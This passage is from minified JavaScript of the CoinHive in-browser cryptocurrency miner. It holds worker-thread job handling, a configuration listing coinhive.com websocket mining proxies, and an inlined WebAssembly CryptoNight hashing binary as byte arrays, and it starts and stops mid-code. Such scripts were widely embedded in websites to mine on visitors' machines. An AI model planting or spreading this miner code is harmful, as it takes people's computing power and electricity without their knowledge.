if(this.verifyJob){this.worker.postMessage(this.verifyJob)}};JobThread.prototype.onReceiveMsg=function(msg){if(msg.data.verify_id){this.verifyCallback(msg.data);return}if(msg.data.result){this.jobCallback(msg.data)}this.hashesPerSecond=this.hashesPerSecond*.5+msg.data.hashesPerSecond*.5;this.hashesTotal+=msg.data.hashes;this.lastMessageTimestamp=Date.now();if(this.running){this.worker.postMessage(this.currentJob)}};JobThread.prototype.setJob=function(job,callback){this.currentJob=job;this.jobCallback=callback;if(this._isReady&&!this.running){this.running=true;this.worker.postMessage(this.currentJob)}};JobThread.prototype.verify=function(job,callback){this.verifyCallback=callback;if(!this._isReady){this.verifyJob=job}else{this.worker.postMessage(job)}};JobThread.prototype.stop=function(){if(this.worker){this.worker.terminate();this.worker=null}this.running=false};window.CoinHive.JobThread=JobThread})(window);self.CoinHive=self.CoinHive||{};self.CoinHive.CONFIG={LIB_URL:"https://coinhive.com/lib/",ASMJS_NAME:"worker-asmjs.min.js?v8",REQUIRES_AUTH:false,WEBSOCKET_SHARDS:[["wss://ws001.coinhive.com/proxy","wss://ws002.coinhive.com/proxy","wss://ws003.coinhive.com/proxy","wss://ws004.coinhive.com/proxy","wss://ws005.coinhive.com/proxy","wss://ws006.coinhive.com/proxy","wss://ws007.coinhive.com/proxy","wss://ws008.coinhive.com/proxy"],["wss://ws009.coinhive.com/proxy","wss://ws010.coinhive.com/proxy","wss://ws011.coinhive.com/proxy","wss://ws012.coinhive.com/proxy","wss://ws013.coinhive.com/proxy","wss://ws014.coinhive.com/proxy","wss://ws015.coinhive.com/proxy","wss://ws016.coinhive.com/proxy"],["wss://ws017.coinhive.com/proxy","wss://ws018.coinhive.com/proxy","wss://ws019.coinhive.com/proxy","wss://ws020.coinhive.com/proxy","wss://ws021.coinhive.com/proxy","wss://ws022.coinhive.com/proxy","wss://ws023.coinhive.com/proxy","wss://ws024.coinhive.com/proxy"],["wss://ws025.coinhive.com/proxy","wss://ws026.coinhive.com/proxy","wss://ws027.coinhive.com/proxy","wss://ws028.coinhive.com/proxy","wss://ws029.coinhive.com/proxy","wss://ws030.coinhive.com/proxy","wss://ws031.coinhive.com/proxy","wss://ws032.coinhive.com/proxy"]],CAPTCHA_URL:"https://coinhive.com/captcha/",MINER_URL:"https://coinhive.com/media/miner.html",AUTH_URL:"https://authedmine.com/authenticate.html"};CoinHive.CRYPTONIGHT_WORKER_BLOB=CoinHive.Res(" self.WASM_BINARY_INLINE= [0,97,115,109,1,0,0,0,1,51,9,96,3,127,127,127,0,96,1,127,0,96,0,1,127,96,2,127,127,1,127,96,3,127,127,127,1,127,96,1,127,1,127,96,2,127,127,0,96,4,127,127,127,127,0,96,3,127,127,126,0,2,136,2,14,3,101,110,118,6,109,101,109,111,114,121,2,1,128,2,128,2,3,101,110,118,5,116,97,98,108,101,1,112,1,8,8,3,101,110,118,9,116,97,98,108,101,66,97,115,101,3,127,0,3,101,110,118,14,68,89,78,65,77,73,67,84,79,80,95,80,84,82,3,127,0,3,101,110,118,8,83,84,65,67,75,84,79,80,3,127,0,3,101,110,118,5,97,98,111,114,116,0,1,3,101,110,118,13,101,110,108,97,114,103,101,77,101,109,111,114,121,0,2,3,101,110,118,14,103,101,116,84,111,116,97,108,77,101,109,111,114,121,0,2,3,101,110,118,23,97,98,111,114,116,79,110,67,97,110,110,111,116,71,114,111,119,77,101,109,111,114,121,0,2,3,101,110,118,11,95,95,95,115,101,116,69,114,114,78,111,0,1,3,101,110,118,12,95,95,95,115,121,115,99,97,108,108,50,48,0,3,3,101,110,118,22,95,101,109,115,99,114,105,112,116,101,110,95,109,101,109,99,112,121,95,98,105,103,0,4,3,101,110,118,6,95,102,116,105,109,101,0,5,3,101,110,118,7,95,103,109,116,105,109,101,0,5,3,31,30,6,0,4,1,0,4,5,5,8,6,1,0,0,1,7,0,7,7,6,1,2,0,4,0,0,0,7,7,7,5,6,11,2,127,1,35,1,11,127,1,35,2,11,7,180,1,8,18,95,97,101,115,98,95,115,105,110,103,108,101,95,114,111,117,110,100,0,20,19,95,99,114,121,112,116,111,110,105,103,104,116,95,99,114,101,97,116,101,0,29,20,95,99,114,121,112,116,111,110,105,103,104,116,95,100,101,115,116,114,111,121,0,28,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,48,0,37,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,49,0,36,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,50,0,35,7,95,109,97,108,108,111,99,0,16,10,115,116,97,99,107,65,108,108,111,99,0,38,9,14,1,0,35,0,11,8,21,34,30,33,32,21,21,21,10,218,219,3,30,227,25,1,10,127,32,0,32,0,40,2,0,34,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,0,115,32,0,65,4,106,34,9,40,2,0,34,4,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,0,65,8,106,34,10,40,2,0,34,5,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,0,65,12,106,34,11,40,2,0,34,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,6,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,16,115,32,4,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,4,115,32,5,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,3,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,7,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,8,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,3,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,4,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,8,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,12,115,32,3,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,4,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,5,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,3,54,2,0,32,9,32,7,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,20,115,32,8,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,6,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,4,54,2,0,32,10,32,8,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,24,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,6,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,7,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,5,54,2,0,32,11,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,28,115,32,6,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,7,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,8,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,54,2,0,32,0,32,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,32,115,32,4,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,6,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,48,115,32,4,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,36,115,32,5,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,3,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,7,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,40,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,3,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,4,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,8,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,44,115,32,3,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,4,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,5,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,3,54,2,0,32,9,32,7,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,52,115,32,8,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,6,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,4,54,2,0,32,10,32,8,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,56,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,6,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,7,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,5,54,2,0,32,11,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,60,115,32,6,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,7,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,8,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,54,2,0,32,0,32,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,64,115,32,4,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,6,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,80,115,32,4,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,68,115,32,5,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,3,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,7,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,72,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,3,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,4,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,8,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,76,115,32,3,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,4,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,5,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,3,54,2,0,32,9,32,7,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,84,115,32,8,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,6,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,4,54,2,0,32,10,32,8,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,88,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,6,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,7,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,5,54,2,0,32,11,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,92,115,32,6,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,7,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,8,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,54,2,0,32,0,32,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,96,115,32,4,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,6,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,112,115,32,4,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,100,115,32,5,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,3,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,7,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,104,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,3,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,4,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,8,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,108,115,32,3,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,4,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,5,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,3,54,2,0,32,9,32,7,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,116,115,32,8,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,6,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,4,54,2,0,32,10,32,8,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,120,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,6,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,7,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,5,54,2,0,32,11,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,124,115,32,6,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,7,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,8,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,2,54,2,0,32,0,32,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,128,1,115,32,4,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,0,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,144,1,115,32,4,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,132,1,115,32,5,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,2,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,3,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,6,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,5,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,136,1,115,32,2,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,3,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,4,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,7,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,2,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,140,1,115,32,3,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,4,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,5,65,24,118,65,2,116,65,128,32,106,40,2,0,115,34,3,65,24,118,65,2,116,65,128,32,106,40,2,0,115,54,2,0,32,9,32,6,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,148,1,115,32,7,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,3,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,0,65,24,118,65,2,116,65,128,32,106,40,2,0,115,54,2,0,32,10,32,7,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,152,1,115,32,3,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,0,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,6,65,24,118,65,2,116,65,128,32,106,40,2,0,115,54,2,0,32,11,32,3,65,255,1,113,65,2,116,65,128,8,106,40,2,0,32,1,40,2,156,1,115,32,0,65,8,118,65,255,1,113,65,2,116,65,128,16,106,40,2,0,115,32,6,65,16,118,65,255,1,113,65,2,116,65,128,24,106,40,2,0,115,32,7,65,24,118,65,2,116,65,128,32,106,40,2,0,115,54,2,0,11,217,29,1,21,127,32,0,32,0,40,2,0,32,2,115,34,4,54,2,0,32,2,65,16,115,32,0,65,8,106,34,11,40,2,0,115,33,7,32,11,32,7,54,2,0,32,2,65,32,115,32,0,65,16,106,34,12,40,2,0,115,33,8,32,12,32,8,54,2,0,32,2,65,48,115,32,0,65,24,106,34,14,40,2,0,115,33,3,32,14,32,3,54,2,0,32,0,65,32,106,34,15,32,2,65,192,0,115,32,15,40,2,0,115,54,2,0,32,0,65,40,106,34,17,32,2,65,208,0,115,32,17,40,2,0,115,54,2,0,32,0,65,48,106,34,19,32,2,65,224,0,115,32,19,40,2,0,115,54,2,0,32,0,65,56,106,34,21,32,2,65,240,0,115,32,21,40,2,0,115,54,2,0,32,7,65,7,118,65,254,3,113,34,9,65,2,116,65,208,42,106,40,2,0,33,2,32,8,65,15,118,65,254,3,113,34,10,65,2,116,65,208,42,106,40,2,0,33,7,32,3,65,24,118,65,1,116,34,13,65,2,116,65,208,42,106,40,2,0,33,8,32,0,45,0,45,65,1,116,34,16,65,2,116,65,208,42,106,40,2,0,33,3,32,0,45,0,54,65,1,116,34,18,65,2,116,65,208,42,106,40,2,0,33,6,32,0,45,0,63,65,1,116,34,20,65,2,116,65,208,42,106,40,2,0,33,5,32,9,65,1,114,65,2,116,65,208,42,106,40,2,0,34,9,65,8,116,32,2,65,24,118,114,32,4,65,1,116,65,254,3,113,34,4,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,10,65,1,114,65,2,116,65,208,42,106,40,2,0,34,10,65,16,116,32,7,65,16,118,114,115,32,13,65,1,114,65,2,116,65,208,42,106,40,2,0,34,13,65,24,116,32,8,65,8,118,114,115,32,0,45,0,36,65,1,116,34,22,65,2,116,65,208,42,106,40,2,0,115,32,16,65,1,114,65,2,116,65,208,42,106,40,2,0,34,16,65,24,118,32,3,65,8,116,114,115,32,18,65,1,114,65,2,116,65,208,42,106,40,2,0,34,18,65,16,118,32,6,65,16,116,114,115,32,20,65,1,114,65,2,116,65,208,42,106,40,2,0,34,20,65,8,118,32,5,65,24,116,114,115,33,23,32,1,32,9,65,24,118,32,2,65,8,116,114,32,4,65,2,116,65,208,42,106,40,2,0,115,32,10,65,16,118,32,7,65,16,116,114,115,32,13,65,8,118,32,8,65,24,116,114,115,32,22,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,16,65,8,116,32,3,65,24,118,114,115,32,18,65,16,116,32,6,65,16,118,114,115,32,20,65,24,116,32,5,65,8,118,114,115,54,2,0,32,1,32,23,54,2,4,32,0,45,0,17,65,1,116,34,4,65,2,116,65,208,42,106,40,2,0,33,2,32,0,45,0,26,65,1,116,34,9,65,2,116,65,208,42,106,40,2,0,33,7,32,0,45,0,35,65,1,116,34,10,65,2,116,65,208,42,106,40,2,0,33,8,32,0,45,0,53,65,1,116,34,13,65,2,116,65,208,42,106,40,2,0,33,3,32,0,45,0,62,65,1,116,34,16,65,2,116,65,208,42,106,40,2,0,33,6,32,0,45,0,7,65,1,116,34,18,65,2,116,65,208,42,106,40,2,0,33,5,32,4,65,1,114,65,2,116,65,208,42,106,40,2,0,34,4,65,8,116,32,2,65,24,118,114,32,11,45,0,0,65,1,116,34,11,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,9,65,1,114,65,2,116,65,208,42,106,40,2,0,34,9,65,16,116,32,7,65,16,118,114,115,32,10,65,1,114,65,2,116,65,208,42,106,40,2,0,34,10,65,24,116,32,8,65,8,118,114,115,32,0,45,0,44,65,1,116,34,20,65,2,116,65,208,42,106,40,2,0,115,32,13,65,1,114,65,2,116,65,208,42,106,40,2,0,34,13,65,24,118,32,3,65,8,116,114,115,32,16,65,1,114,65,2,116,65,208,42,106,40,2,0,34,16,65,16,118,32,6,65,16,116,114,115,32,18,65,1,114,65,2,116,65,208,42,106,40,2,0,34,18,65,8,118,32,5,65,24,116,114,115,33,22,32,1,32,4,65,24,118,32,2,65,8,116,114,32,11,65,2,116,65,208,42,106,40,2,0,115,32,9,65,16,118,32,7,65,16,116,114,115,32,10,65,8,118,32,8,65,24,116,114,115,32,20,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,13,65,8,116,32,3,65,24,118,114,115,32,16,65,16,116,32,6,65,16,118,114,115,32,18,65,24,116,32,5,65,8,118,114,115,54,2,8,32,1,32,22,54,2,12,32,0,45,0,25,65,1,116,34,5,65,2,116,65,208,42,106,40,2,0,33,2,32,0,45,0,34,65,1,116,34,4,65,2,116,65,208,42,106,40,2,0,33,11,32,0,45,0,43,65,1,116,34,9,65,2,116,65,208,42,106,40,2,0,33,7,32,0,45,0,61,65,1,116,34,10,65,2,116,65,208,42,106,40,2,0,33,8,32,0,45,0,6,65,1,116,34,13,65,2,116,65,208,42,106,40,2,0,33,3,32,0,45,0,15,65,1,116,34,16,65,2,116,65,208,42,106,40,2,0,33,6,32,5,65,1,114,65,2,116,65,208,42,106,40,2,0,34,5,65,8,116,32,2,65,24,118,114,32,12,45,0,0,65,1,116,34,12,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,4,65,1,114,65,2,116,65,208,42,106,40,2,0,34,4,65,16,116,32,11,65,16,118,114,115,32,9,65,1,114,65,2,116,65,208,42,106,40,2,0,34,9,65,24,116,32,7,65,8,118,114,115,32,0,45,0,52,65,1,116,34,18,65,2,116,65,208,42,106,40,2,0,115,32,10,65,1,114,65,2,116,65,208,42,106,40,2,0,34,10,65,24,118,32,8,65,8,116,114,115,32,13,65,1,114,65,2,116,65,208,42,106,40,2,0,34,13,65,16,118,32,3,65,16,116,114,115,32,16,65,1,114,65,2,116,65,208,42,106,40,2,0,34,16,65,8,118,32,6,65,24,116,114,115,33,20,32,1,32,5,65,24,118,32,2,65,8,116,114,32,12,65,2,116,65,208,42,106,40,2,0,115,32,4,65,16,118,32,11,65,16,116,114,115,32,9,65,8,118,32,7,65,24,116,114,115,32,18,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,10,65,8,116,32,8,65,24,118,114,115,32,13,65,16,116,32,3,65,16,118,114,115,32,16,65,24,116,32,6,65,8,118,114,115,54,2,16,32,1,32,20,54,2,20,32,0,45,0,33,65,1,116,34,6,65,2,116,65,208,42,106,40,2,0,33,2,32,0,45,0,42,65,1,116,34,5,65,2,116,65,208,42,106,40,2,0,33,11,32,0,45,0,51,65,1,116,34,4,65,2,116,65,208,42,106,40,2,0,33,7,32,0,45,0,5,65,1,116,34,9,65,2,116,65,208,42,106,40,2,0,33,12,32,0,45,0,14,65,1,116,34,10,65,2,116,65,208,42,106,40,2,0,33,8,32,0,45,0,23,65,1,116,34,13,65,2,116,65,208,42,106,40,2,0,33,3,32,6,65,1,114,65,2,116,65,208,42,106,40,2,0,34,6,65,8,116,32,2,65,24,118,114,32,14,45,0,0,65,1,116,34,14,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,5,65,1,114,65,2,116,65,208,42,106,40,2,0,34,5,65,16,116,32,11,65,16,118,114,115,32,4,65,1,114,65,2,116,65,208,42,106,40,2,0,34,4,65,24,116,32,7,65,8,118,114,115,32,0,45,0,60,65,1,116,34,16,65,2,116,65,208,42,106,40,2,0,115,32,9,65,1,114,65,2,116,65,208,42,106,40,2,0,34,9,65,24,118,32,12,65,8,116,114,115,32,10,65,1,114,65,2,116,65,208,42,106,40,2,0,34,10,65,16,118,32,8,65,16,116,114,115,32,13,65,1,114,65,2,116,65,208,42,106,40,2,0,34,13,65,8,118,32,3,65,24,116,114,115,33,18,32,1,32,6,65,24,118,32,2,65,8,116,114,32,14,65,2,116,65,208,42,106,40,2,0,115,32,5,65,16,118,32,11,65,16,116,114,115,32,4,65,8,118,32,7,65,24,116,114,115,32,16,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,9,65,8,116,32,12,65,24,118,114,115,32,10,65,16,116,32,8,65,16,118,114,115,32,13,65,24,116,32,3,65,8,118,114,115,54,2,24,32,1,32,18,54,2,28,32,0,45,0,41,65,1,116,34,3,65,2,116,65,208,42,106,40,2,0,33,2,32,0,45,0,50,65,1,116,34,6,65,2,116,65,208,42,106,40,2,0,33,11,32,0,45,0,59,65,1,116,34,5,65,2,116,65,208,42,106,40,2,0,33,7,32,0,45,0,13,65,1,116,34,4,65,2,116,65,208,42,106,40,2,0,33,12,32,0,45,0,22,65,1,116,34,9,65,2,116,65,208,42,106,40,2,0,33,8,32,0,45,0,31,65,1,116,34,10,65,2,116,65,208,42,106,40,2,0,33,14,32,3,65,1,114,65,2,116,65,208,42,106,40,2,0,34,3,65,8,116,32,2,65,24,118,114,32,15,45,0,0,65,1,116,34,15,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,6,65,1,114,65,2,116,65,208,42,106,40,2,0,34,6,65,16,116,32,11,65,16,118,114,115,32,5,65,1,114,65,2,116,65,208,42,106,40,2,0,34,5,65,24,116,32,7,65,8,118,114,115,32,0,45,0,4,65,1,116,34,13,65,2,116,65,208,42,106,40,2,0,115,32,4,65,1,114,65,2,116,65,208,42,106,40,2,0,34,4,65,24,118,32,12,65,8,116,114,115,32,9,65,1,114,65,2,116,65,208,42,106,40,2,0,34,9,65,16,118,32,8,65,16,116,114,115,32,10,65,1,114,65,2,116,65,208,42,106,40,2,0,34,10,65,8,118,32,14,65,24,116,114,115,33,16,32,1,32,3,65,24,118,32,2,65,8,116,114,32,15,65,2,116,65,208,42,106,40,2,0,115,32,6,65,16,118,32,11,65,16,116,114,115,32,5,65,8,118,32,7,65,24,116,114,115,32,13,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,4,65,8,116,32,12,65,24,118,114,115,32,9,65,16,116,32,8,65,16,118,114,115,32,10,65,24,116,32,14,65,8,118,114,115,54,2,32,32,1,32,16,54,2,36,32,0,45,0,49,65,1,116,34,3,65,2,116,65,208,42,106,40,2,0,33,2,32,0,45,0,58,65,1,116,34,15,65,2,116,65,208,42,106,40,2,0,33,11,32,0,45,0,3,65,1,116,34,6,65,2,116,65,208,42,106,40,2,0,33,7,32,0,45,0,21,65,1,116,34,5,65,2,116,65,208,42,106,40,2,0,33,12,32,0,45,0,30,65,1,116,34,4,65,2,116,65,208,42,106,40,2,0,33,8,32,0,45,0,39,65,1,116,34,9,65,2,116,65,208,42,106,40,2,0,33,14,32,3,65,1,114,65,2,116,65,208,42,106,40,2,0,34,3,65,8,116,32,2,65,24,118,114,32,17,45,0,0,65,1,116,34,17,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,15,65,1,114,65,2,116,65,208,42,106,40,2,0,34,15,65,16,116,32,11,65,16,118,114,115,32,6,65,1,114,65,2,116,65,208,42,106,40,2,0,34,6,65,24,116,32,7,65,8,118,114,115,32,0,45,0,12,65,1,116,34,10,65,2,116,65,208,42,106,40,2,0,115,32,5,65,1,114,65,2,116,65,208,42,106,40,2,0,34,5,65,24,118,32,12,65,8,116,114,115,32,4,65,1,114,65,2,116,65,208,42,106,40,2,0,34,4,65,16,118,32,8,65,16,116,114,115,32,9,65,1,114,65,2,116,65,208,42,106,40,2,0,34,9,65,8,118,32,14,65,24,116,114,115,33,13,32,1,32,3,65,24,118,32,2,65,8,116,114,32,17,65,2,116,65,208,42,106,40,2,0,115,32,15,65,16,118,32,11,65,16,116,114,115,32,6,65,8,118,32,7,65,24,116,114,115,32,10,65,1,114,65,2,116,65,208,42,106,40,2,0,115,32,5,65,8,116,32,12,65,24,118,114,115,32,4,65,16,116,32,8,65,16,118,114,115,32,9,65,24,116,32,14,65,8,118,114,115,54,2,40,32,1,32,13,54,2,44,32,0,45,0,57,65,1,116,34,3,65,2,116,65,208,42,106,40,2,0,33,2,32,0,45,0,2,65,1,116,34,15,65,2,116,65,208,42,106,40,2,0,33,11,32,0,45,0,11,65,1,116,34,17,65,2,116,65,208,42,106,40,2,0,33,7,32,0,45,0,29,65,1,116,34,6,65,2,116,65,208,42,106,40,2,0,33,12,32,0,45,0,38,65,1,116,34,5,65,2,116,65,